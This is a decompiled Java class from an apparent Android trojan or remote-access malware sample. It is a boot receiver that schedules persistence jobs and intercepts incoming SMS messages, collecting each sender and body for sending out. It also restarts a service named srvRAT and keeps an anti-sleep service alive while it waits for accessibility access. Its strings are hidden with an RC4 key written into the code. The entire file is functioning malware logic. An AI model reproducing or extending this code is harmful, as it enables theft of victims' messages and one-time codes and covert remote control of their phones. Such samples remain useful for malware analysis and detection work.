/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.telephony.SmsMessage
 *  android.util.Base64
 */
package com.example.mmm.Receiver;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvAntiSleep;
import com.example.mmm.Service.srvRAT;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class bootReceiver
extends BroadcastReceiver {
    constants phantom$ = new constants();
    utils letting$;
    private String forgot$;

    public bootReceiver() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(bootReceiver.class.getSimpleName());
        stringBuilder.append("   ");
        this.forgot$ = stringBuilder.toString();
        this.letting$ = new utils();
    }

    private String a(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public void onReceive(Context context, Intent object) {
        String string;
        this.letting$.Log(this.forgot$, "run_boot_broadcast_receiver");
        utils.scheduleJob(context);
        utils.startCustomTimer(context, "", 20000L);
        int n2 = Integer.parseInt(this.letting$.SettingsRead(context, "SM"));
        this.letting$.SettingsWrite(context, "SM", String.valueOf(n2 + 1));
        if (!utils._prayer(context)) {
            this.letting$._firms(this.forgot$, context);
        }
        this.letting$._currency(context);
        this.letting$._antiques(context);
        if (object.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            utils utils3 = this.letting$;
            if ((object = object.getExtras()) != null) {
                Object object2 = (Object[])object.get("pdus");
                string = "";
                object = "";
                if (object2 != null) {
                    int n3 = ((Object[])object2).length;
                    for (n2 = 0; n2 < n3; ++n2) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[])((byte[])object2[n2]));
                        string = smsMessage.getDisplayOriginatingAddress();
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.append((String)object);
                        stringBuilder.append(smsMessage.getDisplayMessageBody());
                        object = stringBuilder.toString();
                    }
                    object2 = new StringBuilder("Input SMS: ");
                    ((StringBuilder)object2).append(string);
                    ((StringBuilder)object2).append(" Text: ");
                    ((StringBuilder)object2).append((String)object);
                    ((StringBuilder)object2).append("[143523#]");
                    object = ((StringBuilder)object2).toString();
                    utils3.Log("sendSMS", (String)object);
                    utils3.SettingsToAdd(context, "AS", (String)object);
                    utils3._compiled(context, utils3.SettingsRead(context, "QQ"));
                }
            }
        }
        if (!utils.isMyServiceRunning(context, srvRAT.class) && this.letting$.SettingsRead(context, "RQ").equals("connect")) {
            context.startService(new Intent(context, srvRAT.class));
        }
        if ((((String)(object = "ES")).equals("1") || this.phantom$.meters$ && !utils.isAccessibilityServiceEnabled(context, srvAccessibility.class)) && !this.letting$.SettingsRead(context, "EL").equals("start")) {
            string = new Intent(context, srvAntiSleep.class);
            string.setAction("start");
            if (Build.VERSION.SDK_INT >= 26) {
                this.letting$.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
                context.startForegroundService((Intent)string);
            } else {
                this.letting$.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
                context.startService((Intent)string);
            }
        }
        if (((String)object).equals("1")) return;
        if (!utils.isAccessibilityServiceEnabled(context, srvAccessibility.class)) return;
        if (!this.letting$.SettingsRead(context, "EL").equals("start")) return;
        object = new Intent(context, srvAntiSleep.class);
        object.setAction("stop");
        context.startService((Intent)object);
    }
}

